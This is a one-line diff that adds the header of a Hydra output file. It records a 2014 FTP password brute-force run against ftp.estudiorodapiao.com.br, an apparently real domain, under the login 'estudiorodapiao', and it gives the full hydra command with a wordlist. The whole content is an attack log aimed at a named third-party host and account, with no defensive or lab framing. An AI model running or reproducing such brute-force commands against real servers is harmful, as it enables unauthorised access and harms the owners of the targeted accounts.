@@ -1,0 +1,1 @@
+# Hydra v7.5 run at 2014-06-29 05:11:25 on ftp.estudiorodapiao.com.br ftp (hydra  -l estudiorodapiao -P wordlist.txt -o bruteforce.txt ftp.estudiorodapiao.com.br ftp)
